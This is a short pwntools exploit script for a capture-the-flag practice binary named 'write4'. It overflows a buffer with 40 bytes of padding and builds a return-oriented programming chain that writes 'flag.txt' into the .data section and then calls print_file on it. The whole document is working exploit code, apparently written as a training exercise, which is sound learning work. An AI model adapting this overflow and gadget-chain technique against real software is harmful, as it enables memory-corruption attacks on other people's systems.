from pwn import *
elf = context.binary = ELF("./write4")
io = process("./write4")

data_addr = 0x00601028
gadget_write1 = 0x00400690  # pop r14 ; pop r15 ; ret
gadget_write2 = 0x00400628  # mov qword ptr [r14], r15 ; ret
pop_rdi =  0x00400693       # pop rdi; ret

def write_in_data(data):
    p = b""
    for i in range(0,len(data),8):
        print("Loop: ",i)
        chunk = data[i:i+8].ljust(8,b"\x00")
        p += p64(gadget_write1)
        p += p64(data_addr + i)                    #r14
        p += p64(int.from_bytes(chunk,'little'))   #r15
        p += p64(gadget_write2)
    return p

payload = b"A" * 40
payload += write_in_data(b"flag.txt\x00")  # write "flag.txt" en .data
payload += p64(pop_rdi)
payload += p64(data_addr)              # "flag.txt"
payload += p64(elf.plt['print_file'])  # print_file("flag.txt")
print(payload)
io.recv()
io.sendline(payload)
io.interactive()
